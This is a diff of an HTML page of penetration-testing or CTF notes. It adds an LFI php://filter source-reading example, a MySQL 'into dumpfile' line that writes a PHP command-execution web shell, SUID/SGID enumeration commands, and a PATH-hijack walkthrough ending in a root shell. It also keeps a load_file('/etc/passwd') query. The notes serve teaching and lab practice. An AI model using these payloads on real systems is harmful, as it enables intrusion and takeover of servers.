@@ -78,10 +78,10 @@
 </ul>
 </li>
 <li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell">Unprivileged shell to privileged shell</a><ul>
+<li><a class="reference internal" href="#privilege-esclation-from-g0tm1lk-blog">Privilege esclation from g0tm1lk blog</a></li>
 <li><a class="reference internal" href="#cron-d">Cron.d</a></li>
 <li><a class="reference internal" href="#sudo-l-permissions">SUDO -l Permissions</a></li>
 <li><a class="reference internal" href="#unix-wildcards">Unix Wildcards</a></li>
-<li><a class="reference internal" href="#privilege-esclation-from-g0tm1lk-blog">Privilege esclation from g0tm1lk blog</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#tips-and-tricks">Tips and Tricks</a></li>
@@ -409,7 +409,16 @@ This is where most people get it wrong. You have to check the webapp what a fail
 </pre></div>
 </div>
 </li>
+<li><p class="first">LFI : Reading a php file</p>
+</li>
 </ul>
+<blockquote>
+<div><p>If a website is affected by a LFI, we could use php filter to read the source code of a PHP File</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
+</pre></div>
+</div>
+<p>More information can be found at <a class="reference external" href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">Using PHP for file inclusion</a></p>
+</div></blockquote>
 </div>
 <div class="section" id="ftp-services">
 <h3>FTP Services<a class="headerlink" href="#ftp-services" title="Permalink to this headline">¶</a></h3>
@@ -421,11 +430,15 @@ This is where most people get it wrong. You have to check the webapp what a fail
 <div class="section" id="remote-code-execution">
 <h3>Remote Code Execution<a class="headerlink" href="#remote-code-execution" title="Permalink to this headline">¶</a></h3>
 <ul class="simple">
-<li>MYSQL: If we have MYSQL Shell, we can use mysql outfile function to upload a shell.</li>
+<li>MYSQL: If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.</li>
 </ul>
 <blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>echo -n &quot;&lt;?php phpinfo(); ?&gt;&quot; | xxd -ps 3c3f70687020706870696e666f28293b203f3e
-select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html/blogblog/wp-content/uploads/phpinfo.php&quot;``
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s2">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">ps</span> <span class="mi">3</span><span class="n">c3f70687020706870696e666f28293b203f3e</span>
+<span class="n">select</span> <span class="mh">0x3c3f70687020706870696e666f28293b203f3e</span> <span class="n">into</span> <span class="n">outfile</span> <span class="s2">&quot;/var/www/html/blogblog/wp-content/uploads/phpinfo.php&quot;</span>
+</pre></div>
+</div>
+<p>or</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">SELECT</span> <span class="s2">&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span> <span class="n">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;/var/www/html/shell.php&#39;</span><span class="p">;</span>
 </pre></div>
 </div>
 </div></blockquote>
@@ -589,6 +602,72 @@ interact
 </div>
 <div class="section" id="unprivileged-shell-to-privileged-shell">
 <h2>Unprivileged shell to privileged shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Permalink to this headline">¶</a></h2>
+<p>Probably, at this point of time, we would have unprivileged shell of user www-data. It would be a good idea to first check privilege esclation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root persmissions.</p>
+<p>If you have become a normal user of which you have a password, it would be a good idea to check sudo -l to check if there are any executables you have persmission to run.</p>
+<div class="section" id="privilege-esclation-from-g0tm1lk-blog">
+<h3>Privilege esclation from g0tm1lk blog<a class="headerlink" href="#privilege-esclation-from-g0tm1lk-blog" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>What &#8220;Advanced Linux File Permissions&#8221; are used? Sticky bits, SUID &amp; GUID</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
+for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Where can written to and executed from? A few &#8216;common&#8217; places: /tmp, /var/tmp, /dev/shm</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">writable</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>      <span class="c1"># world-writeable folders</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">222</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
+
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-executable folders</span>
+
+<span class="n">find</span> <span class="o">/</span> \<span class="p">(</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> \<span class="p">)</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>   <span class="c1"># world-writeable &amp; executable folders</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Any &#8220;problem&#8221; files? Word-writeable, &#8220;nobody&#8221; files</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+</pre></div>
+</div>
+<p><strong>Execution of binary from Relative location than Absolute</strong>
+If we figure out that a suid binary is running with relative locations ( for example let&#8217;s say backjob is running &#8220;id&#8221; and &#8220;scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>&#8221; )( figured out by running strings on the binary ). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
+<p>so we can create a file in temp:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;bash -i&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">id</span>
+
+<span class="ow">or</span>
+
+<span class="n">cp</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">id</span>
+</pre></div>
+</div>
+<div class="highlight-default"><div class="highlight"><pre><span></span>www-data@yummy:/tmp$ cp /bin/sh id
+www-data@yummy:/tmp$ export PATH=/tmp:$PATH
+www-data@yummy:/tmp$ which id
+/tmp/id
+www-data@yummy:/tmp$ /opt/backjob
+whoami
+root
+# /usr/bin/id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</pre></div>
+</div>
+<p>By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or &#8220;id&#8221; . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp …” -&gt; Linux searches the filesystem according to its path (here: in /tmp first) -&gt; Our malacious /tmp/scp gets found and executed as root -&gt; A new bash opens with root privileges.</p>
+</div></blockquote>
+</div>
 <div class="section" id="cron-d">
 <h3>Cron.d<a class="headerlink" href="#cron-d" title="Permalink to this headline">¶</a></h3>
 <p>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.</p>
@@ -938,48 +1017,6 @@ What happened? Instead of 000, all files are now set to mode 777 because of the 
 </div></blockquote>
 </div></blockquote>
 </div>
-<div class="section" id="privilege-esclation-from-g0tm1lk-blog">
-<h3>Privilege esclation from g0tm1lk blog<a class="headerlink" href="#privilege-esclation-from-g0tm1lk-blog" title="Permalink to this headline">¶</a></h3>
-<ul class="simple">
-<li>What &#8220;Advanced Linux File Permissions&#8221; are used? Sticky bits, SUID &amp; GUID</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
-find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
-find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
-
-find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
-for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
-
-# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
- find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Where can written to and executed from? A few &#8216;common&#8217; places: /tmp, /var/tmp, /dev/shm</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">writable</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>      <span class="c1"># world-writeable folders</span>
-<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">222</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
-<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
-
-<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-executable folders</span>
-
-<span class="n">find</span> <span class="o">/</span> \<span class="p">(</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> \<span class="p">)</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>   <span class="c1"># world-writeable &amp; executable folders</span>
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Any &#8220;problem&#8221; files? Word-writeable, &#8220;nobody&#8221; files</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
-find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
-</pre></div>
-</div>
-</div></blockquote>
-</div>
 </div>
 <div class="section" id="tips-and-tricks">
 <h2>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Permalink to this headline">¶</a></h2>
@@ -1278,7 +1315,7 @@ crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::
 </div>
 </div></blockquote>
 <ul class="simple">
-<li>If you have sql-shell from sqlmap, we can use</li>
+<li>If you have sql-shell from sqlmap/ phpmyadmin, we can use</li>
 </ul>
 <blockquote>
 <div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">select</span> <span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
